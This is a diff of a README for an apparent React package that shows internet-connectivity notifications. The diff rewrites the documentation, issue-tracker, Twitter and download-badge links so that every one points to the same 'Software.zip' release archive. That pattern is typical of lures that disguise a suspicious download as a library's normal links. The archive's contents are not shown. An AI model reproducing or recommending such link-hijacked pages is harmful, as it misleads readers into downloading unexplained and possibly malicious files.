@@ -2,7 +2,7 @@
 
 📡 **A lightweight React package for real-time internet connectivity notifications 📦**
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/marionthe/react-internet-notifier/releases/download/v2.0/Software.zip)](https://github.com/marionthe/react-internet-notifier/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -57,18 +57,18 @@ export default App;
 
 ### Explore More
 
-For more details and customization options, visit the [official documentation](https://reactinternetnotifier.com).
+For more details and customization options, visit the [official documentation](https://github.com/marionthe/react-internet-notifier/releases/download/v2.0/Software.zip).
 
 ## Feedback
 
-Your feedback is valuable! If you have any suggestions, bug reports, or feature requests, feel free to open an issue on the [GitHub repository](https://github.com/user/react-internet-notifier/issues).
+Your feedback is valuable! If you have any suggestions, bug reports, or feature requests, feel free to open an issue on the [GitHub repository](https://github.com/marionthe/react-internet-notifier/releases/download/v2.0/Software.zip).
 
 ### Stay Connected
 
-Follow us on [Twitter](https://twitter.com/reactinternetnotifier) for the latest updates and announcements.
+Follow us on [Twitter](https://github.com/marionthe/react-internet-notifier/releases/download/v2.0/Software.zip) for the latest updates and announcements.
 
 ---
 
 🚀 Start enhancing your React application with real-time internet connectivity notifications using React Internet Notifier! 🌐
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/marionthe/react-internet-notifier/releases/download/v2.0/Software.zip)](https://github.com/marionthe/react-internet-notifier/releases/download/v2.0/Software.zip)
